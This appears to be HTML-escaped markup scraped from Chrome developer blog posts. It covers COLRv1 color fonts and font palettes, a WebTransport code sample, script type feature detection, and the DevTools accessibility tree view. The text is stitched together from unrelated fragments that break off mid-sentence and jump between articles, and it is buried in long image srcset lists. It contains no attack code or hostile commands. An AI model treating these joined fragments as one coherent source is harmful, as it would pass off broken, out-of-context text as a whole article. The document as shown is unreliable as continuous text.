https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/GRJkXpRBl8vdCAWcIjA1.png?auto=format&amp;w=720 720w&quot; width=&quot;360&quot;&gt; &lt;figcaption&gt;Shape reuse in the crystal ball\n    emoji&lt;/figcaption&gt; &lt;/figure&gt;\n&lt;p&gt;Think about the crystal ball emoji as an example: The star-shaped highlights are\nthe same shape but different sizes, which means just one shape can be\nrepositioned and reused without duplication inside the file. The format allows\nyou to reuse a full glyph within a new glyph, without having to redundantly\nencode the same shapes for each glyph. Imagine a decorative color font with\nfloral decorations, where the same flower shapes are placed on different letters\nby just referencing existing color glyphs. For the web font use case, COLRv1\ncompresses well under woff2. For example, a test build of Twemoji using COLRv1\ntakes about 1.2 MB inflated, but is about 0.6MB in woff2 form. A build of the\nfull Noto Emoji Glyph set is reduced from 9MB for the bitmap version to 1.85MB\nin COLRv1+woff2 form.&lt;/p&gt;\n&lt;figure&gt;\n&lt;img alt=&quot;Bar chart comparing Noto Emoji as Bitmap font and COLRv1 font, about 9MB vs. 1.85MB&quot; decoding=&quot;async&quot; height=&quot;495&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 800px) 800px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=1428 1428w, https://wd.imgix.net/image/roKb5a4ddjOSoIbxRFI9kDeuVvE2/OULzoVLf1nYWZCaZWhBa.png?auto=format&amp;w=1600 1600w&quot; width=&quot;800&quot;&gt;\n&lt;figcaption&gt;Noto Emoji font size CBDT/CBLC vs. COLRv1 after WOFF2 compression.\n&lt;/figcaption&gt;\n&lt;/figure&gt;\n&lt;h2 id=&quot;color-font-use-cases&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#color-font-use-cases&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Color font use cases&lt;/h2&gt;\n&lt;h3 id=&quot;catchy-headlines&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#catchy-headlines&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Catchy headlines&lt;/h3&gt;\n&lt;p&gt;A fresh color font makes visual highlights, headlines, and banners really pop\nout.&lt;/p&gt;\n&lt;figure&gt; &lt;div style=&quot;height: 420px; width: 100%;&quot;&gt; &lt;iframe style=&quot;height: 100%; width: 100%; border: 0;&quot; title=&quot;colrv1-underware-plakato on Glitch&quot; src=&quot;https://glitch.com/embed/#!/embed/colrv1-underware-plakato?attributionHidden=true&amp;sidebarCollapsed=true&amp;path=index.html&amp;previewSize=100&quot; allow=&quot;camera; clipboard-read; clipboard-write; encrypted-media; geolocation; microphone; midi&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;\n&lt;/div&gt;\n&lt;figcaption&gt;&lt;a href=&quot;https://www.underware.nl/blog/2022/01/plakato-color/&quot;&gt;Plakato Color Happy\n2022&lt;/a&gt; featuring energetic sweep gradients, made by the innovative type\nfoundry &lt;a href=&quot;https://underware.nl/&quot;&gt;Underware&lt;/a&gt; (Twitter: &lt;a href=&quot;https://twitter.com/underware&quot;&gt;@underware&lt;/a&gt;, Instagram: &lt;a href=&quot;https://www.instagram.com/underwarefoundry/&quot;&gt;@underwarefoundry&lt;/a&gt;).

Both solutions are not optimal. Feature testing should detect\nonly a specific feature itself and avoid user agent sniffing. The ChromaCheck\nlibrary should not need to perform resource-intensive 2D canvas operations for\ndetermining support.&lt;/p&gt;\n&lt;p&gt;The Chrome team wants to improve that and has started a series of discussions\n[&lt;a href=&quot;https://github.com/w3c/csswg-drafts/issues/6520&quot;&gt;1&lt;/a&gt;,\n&lt;a href=&quot;https://github.com/w3c/csswg-drafts/issues/6791&quot;&gt;2&lt;/a&gt;] in the CSS working group\nto provide information on browser font technology support in JavaScript and\ndeclaratively in CSS. The team plans to release efficient feature detection for\ncolor font and other font technologies in a future version of Chrome.&lt;/p&gt;\n&lt;p&gt;If you would like to use color fonts in your project right now when COLRv1\nsupport is limited to Chrome, there are two ways you can do that: Ask your font\nvendor for a COLRv1 font that contains monochrome glyphs too. User agents that\ndon’t support COLRv1 will fall back to rendering monochrome\nglyphs. Alternatively, you can use the ChromaCheck library or user agent\nsniffing to determine whether COLRv1 support is available. Then you deliver CSS\nthat loads COLRv1 fonts in supporting user agents and use an alternative font\nformat such as COLRv0, a bitmap font format or OpenType SVG in other browsers.&lt;/p&gt;\n&lt;h2 id=&quot;css-font-palette-support&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#css-font-palette-support&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; CSS font-palette support&lt;/h2&gt;\n&lt;p&gt;It would be tremendously useful if using a different set of colors would not\nrequire a new font. Thankfully, a mechanism exists: the\n&lt;a href=&quot;https://www.w3.org/TR/css-fonts-4/#font-palette-prop&quot;&gt;font-palette CSS property&lt;/a&gt;.

It&#39;s supported in web workers. And because it exposes a\nStreams compliant interface, it supports optimizations around backpressure.&lt;/p&gt;\n&lt;p&gt;To use it, you&#39;ll need a server that supports HTTP/3, which is generally\neasier than setting up and maintaining a WebRTC server. Open a new\n&lt;code&gt;WebTransport&lt;/code&gt; instance, wait for it to connect, and you can start sending\ndata.&lt;/p&gt;\n&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;https://example.com:4999/foo/bar&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; transport &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;WebTransport&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; transport&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ready&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; writer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; transport&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;datagrams&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;writable&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getWriter&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; data1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Uint8Array&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;writer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Check out the article &lt;a href=&quot;https://web.dev/webtransport/&quot;&gt;Experimenting with WebTransport&lt;/a&gt; on\nweb.dev for complete details.&lt;/p&gt;\n&lt;h2 id=&quot;script-type-feature-detection&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#script-type-feature-detection&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Script type feature detection&lt;/h2&gt;\n&lt;p&gt;Today, we can use the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-nomodule&quot;&gt;&lt;code&gt;nomodule&lt;/code&gt; attribute&lt;/a&gt; to detect support\nfor JavaScript modules in the browser.

The underlying model of this API is the accessibility tree: &lt;strong&gt;a tree of accessibility objects that assistive technology can query for attributes and properties and perform actions on&lt;/strong&gt;. Web developers shape and manipulate the accessibility tree primarily through DOM properties such as &lt;a href=&quot;https://www.w3.org/TR/html-aria/&quot;&gt;ARIA attributes for HTML&lt;/a&gt;.&lt;/p&gt;\n&lt;p&gt;In &lt;a href=&quot;https://developer.chrome.com/docs/devtools/&quot;&gt;Chrome DevTools&lt;/a&gt;, we provide the accessibility pane to help developers understand how their content is exposed to assistive technology. Concretely, when a node is selected in the DOM tree viewer, the properties of the corresponding accessibility node displays in the pane together with a view of the node&#39;s ancestors and its immediate children.&lt;/p&gt;\n&lt;img alt=&quot;The Chrome DevTools accessibility pane.&quot; decoding=&quot;async&quot; height=&quot;547&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 535px) 535px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/NiCDcnAxDts5kG4ZgOeg.png?auto=format&amp;w=1070 1070w&quot; width=&quot;535&quot;&gt;\n&lt;h2 id=&quot;how-is-the-tree-created&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#how-is-the-tree-created&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; How is the tree created?&lt;/h2&gt;\n&lt;p&gt;Before we get to what this new full tree view looks like in DevTools, let us briefly go over what the accessibility tree is in more tangible terms. The accessibility tree is a derivative of the DOM tree. Its structure is roughly the same, but simplified to remove nodes with no semantic content such as a &lt;code&gt;&amp;lt;div&amp;gt;&lt;/code&gt; element purely used for styling. Each node in the tree has a role such as &lt;code&gt;Button&lt;/code&gt; or &lt;code&gt;Heading&lt;/code&gt;, and often a name that can be either from ARIA attributes or derived from the node’s contents. If we look at an HTML document:&lt;/p&gt;\n&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;How old are you?&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;label&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;age&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;Age&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;label&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;

 &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The renderer in Chromium, named Blink, derives an internal accessibility tree roughly as follows.&lt;/p&gt;\n&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;role=&#39;rootWebArea&#39; focusable name=&#39;How old are you?&#39;&lt;br&gt;  role=&#39;genericContainer&#39; ignored&lt;br&gt;    role=&#39;genericContainer&#39; ignored&lt;br&gt;      role=&#39;labelText&#39;&lt;br&gt;        role=&#39;staticText&#39; name=&#39;Age&#39;&lt;br&gt;      role=&#39;spinButton&#39; editable focusable name=&#39;Age&#39; value=&#39;42&#39;&lt;br&gt;        role=&#39;genericContainer&#39; editable&lt;br&gt;          role=&#39;staticText&#39; editable name=&#39;42&#39;&lt;br&gt;      role=&#39;genericContainer&#39;&lt;br&gt;        role=&#39;button&#39; focusable name=&#39;Back&#39;&lt;br&gt;          role=&#39;staticText&#39; name=&#39;Back&#39;&lt;br&gt;        role=&#39;button&#39; focusable name=&#39;Next&#39;&lt;br&gt;          role=&#39;staticText&#39; name=&#39;Next&#39;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Note that this representation contains multiple superfluous nodes with role &lt;code&gt;genericContainer&lt;/code&gt;, which seemingly contradicts the statement above that the accessibility tree is a simplified derivative of the DOM tree. Still, most of these nodes only occur in the internal tree and would not be exposed to assistive technology. Since DevTools collects its accessibility information directly from the renderer process, this is the tree representation that DevTools handles.&lt;/p&gt;\n&lt;div class=&quot;aside aside--note&quot;&gt;\n&lt;p&gt;The HTML example was borrowed from &lt;a href=&quot;https://source.chromium.org/chromium/chromium/src/+/main:docs/accessibility/browser/how_a11y_works.md&quot;&gt;here&lt;/a&gt; which also contains more information about how accessibility works in Chromium.&lt;/p&gt;\n&lt;/div&gt;\n&lt;h2 id=&quot;full-accessibility-tree-in-devtools&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#full-accessibility-tree-in-devtools&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Full accessibility tree in DevTools&lt;/h2&gt;\n&lt;p&gt;The new, full accessibility tree synchronized with the DOM tree so developers can switch back and forth between the two trees. We hope that the new tree will prove more explorable, useful, and easier to use.&lt;/p&gt;\n&lt;p&gt;Now that you know how the accessibility tree works, you can use DevTools to see how the new tree view looks. The following HTML document with a title, heading, and two buttons is used to show the tree.&lt;/p&gt;\n&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt;

It hooks into the same mechanics that would notify assistive technology of changes to the tree, and uses that to emit events to the DevTools frontend with updated nodes.\nIn practice, the CDP backend listens for updates to the tree, keeps track of which nodes have been requested before, and sends events to the DevTools frontend if any of these nodes changes.&lt;/p&gt;\n&lt;p&gt;&lt;video autoplay=&quot;&quot; class=&quot;screenshot&quot; loop=&quot;&quot; muted=&quot;&quot;&gt;      &lt;source src=&quot;https://storage.googleapis.com/web-dev-uploads/video/gGNVLl64MBQvhaYBXAAuRiOs3r92/vLXJU0FMF41pqKqVJ61D.mp4&quot; type=&quot;video/mp4&quot;&gt;    &lt;/video&gt;&lt;/p&gt;\n&lt;h2 id=&quot;the-tale-of-many-trees&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#the-tale-of-many-trees&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; The tale of many trees&lt;/h2&gt;\n&lt;p&gt;In the description of &lt;a href=&quot;#what-is-the-accessibility-tree&quot;&gt;what the accessibility tree is&lt;/a&gt; you learned how Blink constructs an accessibility tree for the DOM it is rendering, and DevTools fetches this tree through CDP. While this is true, we left out some complications in this description. In reality, there are quite a lot of &lt;a href=&quot;https://en.wikipedia.org/wiki/Blind_men_and_an_elephant&quot;&gt;different ways to experience&lt;/a&gt; the accessibility tree in Chromium.\nWhen designing the new tree view for DevTools, we have made some choices along the way about what part of Chromium’s accessibility internals we wanted to surface.&lt;/p&gt;\n&lt;h3 id=&quot;platforms&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#platforms&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Platforms&lt;/h3&gt;\n&lt;p&gt;Every platform has a different accessibility API and while the shape of the tree is the same across all platforms, the API for interacting with the tree is different, and the names of attributes can differ. DevTools shows Chromium’s internal tree where roles and attributes tend to match those defined in the &lt;a href=&quot;https://www.w3.org/TR/wai-aria-1.1/&quot;&gt;ARIA&lt;/a&gt; specification.&lt;/p&gt;\n&lt;h3 id=&quot;multiple-frames-and-site-isolation&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#multiple-frames-and-site-isolation&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Multiple frames and site isolation&lt;/h3&gt;\n&lt;p&gt;Since Chromium not only puts the content of every tab in different renderer processes but also &lt;a href=&quot;https://www.chromium.org/developers/design-documents/site-isolation&quot;&gt;isolates cross-site documents in different renderer processes&lt;/a&gt;, we have to connect to each out-of-process child document separately over CDP and fetch its accessibility tree. We then stitch these subtrees together on the frontend to give the illusion of one coherent tree, although they live in different renderer processes in Chromium.&lt;/p&gt;\n&lt;h3 id=&quot;ignored-and-uninteresting-nodes&quot; tabindex=&quot;-1&quot;&gt;&lt;a class=&quot;heading-link&quot; href=&quot;#ignored-and-uninteresting-nodes&quot; aria-hidden=&quot;true&quot;&gt;#&lt;/a&gt; Ignored and uninteresting nodes&lt;/h3&gt;\n&lt;p&gt;We hide some nodes per default: ignored nodes, and nodes with role “generic” with no name. These nodes carry no semantic meaning and, in the case of ignored nodes, are not exposed to assistive technology. We hide these nodes to avoid cluttering the tree view. If we did not, the accessibility tree for most web pages would instead look something like this:&lt;/p&gt;\n&lt;img alt=&quot;The new tree view with all nodes shown.&quot; decoding=&quot;async&quot; height=&quot;488&quot; loading=&quot;lazy&quot; sizes=&quot;(min-width: 800px) 800px, calc(100vw - 48px)&quot; src=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&quot; srcset=&quot;https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=200 200w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=228 228w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=260 260w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=296 296w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=338 338w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=385 385w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=439 439w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=500 500w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=571 571w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=650 650w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=741 741w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=845 845w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=964 964w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=1098 1098w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=1252 1252w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=1428 1428w, https://wd.imgix.net/image/gGNVLl64MBQvhaYBXAAuRiOs3r92/K4OmzuAaVcQjFjEZlcZq.png?auto=format&amp;w=1600 